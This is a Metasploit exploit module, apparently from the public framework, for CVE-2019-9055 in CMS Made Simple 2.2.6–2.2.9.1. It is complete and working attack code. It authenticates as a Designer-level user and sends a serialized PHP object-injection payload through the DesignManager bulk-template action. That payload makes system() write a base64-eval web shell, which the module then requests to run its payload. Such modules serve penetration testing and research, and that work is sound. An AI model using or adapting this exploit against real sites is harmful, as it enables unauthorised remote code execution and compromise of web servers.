# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;CMS Made Simple Authenticated RCE via object injection&#039;,
      &#039;Description&#039; => %q(
        An issue was discovered in CMS Made Simple 2.2.8.
        In the module DesignManager (in the files action.admin_bulk_css.php
        and action.admin_bulk_template.php), with an unprivileged user
        with Designer permission, it is possible to reach an unserialize
        call with a crafted value in the m1_allparms parameter,
        and achieve object injection.

        This module has been successfully tested on CMS Made Simple versions
        2.2.6, 2.2.7, 2.2.8, 2.2.9 and 2.2.9.1.
      ),
      &#039;Author&#039; => [
        &#039;Daniele Scanu danielescanu20[at]gmail.com&#039;, # Discovered and exploit. twitter.com/sk4pwn
      ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2019-9055&#039;],
        [&#039;CWE&#039;, &#039;74&#039;],
        [&#039;URL&#039;, &#039;https://newsletter.cmsmadesimple.org/w/89247Qog4jCRCuRinvhsofwg&#039;],
        [&#039;URL&#039;, &#039;https://www.cmsmadesimple.org/2019/03/Announcing-CMS-Made-Simple-v2.2.10-Spuzzum&#039;]
      ],
      &#039;Privileged&#039; => false,
      &#039;Platform&#039; => [&#039;php&#039;],
      &#039;Arch&#039; => [ARCH_PHP],
      &#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Mar 26 2019&#039;))
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base cmsms directory path&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;Username to authenticate with&#039;, &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to authenticate with&#039;, &#039;&#039;])
      ]
    )
    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])
  end

  def multipart_form_data(uri, data, message)
    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, uri),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{message.bound}",
      &#039;cookie&#039; => @cookies
    )
  end

  def post(uri, data)
    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, uri),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => data,
      &#039;cookie&#039; => @cookies
    )
  end

  def get(path, filename)
    send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, path, filename),
      &#039;method&#039; => &#039;GET&#039;
    )
  end

  def check
    res = get(&#039;&#039;, &#039;index.php&#039;)
    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.body.match?(/CMS Made Simple/i)
      return CheckCode::Safe
    end

    version = Gem::Version.new(res.body.scan(/CMS Made Simple<\/a> version (\d+\.\d+\.\d+)/).flatten.first)
    vprint_status("#{peer} - CMS Made Simple Version: #{version}")

    if version <= Gem::Version.new(&#039;2.2.9.1&#039;)
      return CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def login
    data = {
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;],
      &#039;loginsubmit&#039; => &#039;Submit&#039;
    }
    res = post(&#039;login.php&#039;, data)

    unless res
      fail_with(Failure::Unreachable,
        &#039;A response was not received from the remote host&#039;)
    end

    unless res.code == 302 && res.get_cookies && res.headers[&#039;Location&#039;] =~ %r{\/admin\?(.*)?=(.*)}
      fail_with(Failure::NoAccess, &#039;Authentication was unsuccessful&#039;)
    end
    store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
    vprint_good("#{peer} - Authentication successful")
    @csrf_name = Regexp.last_match(1)
    csrf_val = Regexp.last_match(2)
    @csrf = { @csrf_name => csrf_val }
    @cookies = res.get_cookies
  end

  def send_injection
    shell_name = rand_text_alpha(8..12) + &#039;.php&#039;
    cmd = Rex::Text.encode_base64(payload.encoded).delete(&#039;\n&#039;, &#039;&#039;)
    cmd = "echo \"<?php eval(base64_decode(&#039;#{cmd}&#039;)); ?>\" > #{shell_name}"

    final_payload = &#039;a:2:{s:10:"css_select";a:4:{i:0;s:2:"19";i:1;s:2:"21";i:2;O:13:"dm_xml_reader":1:{s:31:"&#039;
    final_payload += "\x00" + &#039;dm_xml_reader&#039; + "\x00"
    final_payload += &#039;_old_err_handler";a:2:{i:0;O:21:"CmsLayoutTemplateType":1:{s:28:"&#039;
    final_payload += "\x00" + &#039;CmsLayoutTemplateType&#039; + "\x00"
    final_payload += &#039;_data";a:2:{s:13:"help_callback";s:6:"system";s:4:"name";s:&#039; + cmd.length.to_s + &#039;:"&#039; + cmd + &#039;";}}&#039;
    final_payload += &#039;i:1;s:21:"get_template_helptext";}};i:3;s:5:"dummy";}s:15:"css_bulk_action";s:6:"export";}&#039;

    # create message with payload
    message = Rex::MIME::Message.new
    message.add_part(@csrf[@csrf_name], nil, nil, "form-data; name=\"#{@csrf_name}\"")
    message.add_part(&#039;DesignManager,m1_,admin_bulk_template,0&#039;, nil, nil, &#039;form-data; name="mact"&#039;)
    message.add_part(Rex::Text.encode_base64(final_payload), nil, nil, &#039;form-data; name="m1_allparms"&#039;)
    data = message.to_s

    # send payload
    payload_res = multipart_form_data(&#039;moduleinterface.php&#039;, data, message)
    fail_with(Failure::NotFound, &#039;Failed to send payload&#039;) unless payload_res
    register_files_for_cleanup(shell_name)
    # open shell
    res = get(&#039;admin&#039;, shell_name)
    if res && res.code == 404
      print_error "Shell #{shell_name} not found"
    end
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include?(check)
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end
    login
    send_injection
  end
end

